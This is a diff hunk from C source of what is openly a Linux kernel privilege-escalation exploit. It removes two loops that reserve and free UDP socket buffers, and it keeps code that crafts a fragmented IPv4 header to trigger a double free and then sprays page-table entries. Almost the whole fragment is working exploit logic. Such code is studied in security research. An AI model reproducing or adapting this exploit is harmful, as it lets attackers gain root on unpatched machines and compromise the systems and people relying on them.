@@ -306,25 +306,12 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	printf("[*] waiting for the calm before the storm...\n");
 	sleep(CONFIG_SEC_BEFORE_STORM);
 
-	// pop N skbs from skb freelist
-	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
-	{
-		PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
-		alloc_ipv4_udp(1);
-	}
-
 	// allocate and free 1 skb from freelist
 	df_ip_header.ip_id = 0x1337;
 	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
 	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
 	trigger_double_free_hdr(32768 + 8, &df_ip_header);
 	
-	// push N skbs to skb freelist
-	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
-	{
-		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
-		recv_ipv4_udp(1);
-	}
 
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
